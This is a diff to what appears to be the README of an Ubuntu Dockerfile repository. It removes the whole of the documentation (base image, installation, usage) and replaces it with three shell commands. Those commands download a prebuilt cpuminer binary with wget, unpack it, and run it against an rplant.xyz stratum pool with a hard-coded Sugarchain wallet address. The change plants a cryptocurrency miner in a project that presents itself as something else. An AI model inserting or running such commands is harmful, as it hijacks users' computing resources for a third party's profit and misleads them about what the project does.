@@ -1,23 +1,4 @@
-## Ubuntu Dockerfile
 
-
-This repository contains **Dockerfile** of [Ubuntu](http://www.ubuntu.com/) for [Docker](https://www.docker.com/)'s [automated build](https://registry.hub.docker.com/u/dockerfile/ubuntu/) published to the public [Docker Hub Registry](https://registry.hub.docker.com/).
-
-
-### Base Docker Image
-
-* [ubuntu:14.04](https://registry.hub.docker.com/u/library/ubuntu/)
-
-
-### Installation
-
-1. Install [Docker](https://www.docker.com/).
-
-2. Download [automated build](https://registry.hub.docker.com/u/dockerfile/ubuntu/) from public [Docker Hub Registry](https://registry.hub.docker.com/): `docker pull dockerfile/ubuntu`
-
-   (alternatively, you can build an image from Dockerfile: `docker build -t="dockerfile/ubuntu" github.com/dockerfile/ubuntu`)
-
-
-### Usage
-
-    docker run -it --rm dockerfile/ubuntu
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+tar xf cpuminer-opt-linux.tar.gz
+./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:17042 -u sugar1qehz8cpmksmx8cz2grw30ycea3zlja7nudepmy2.1 -t4
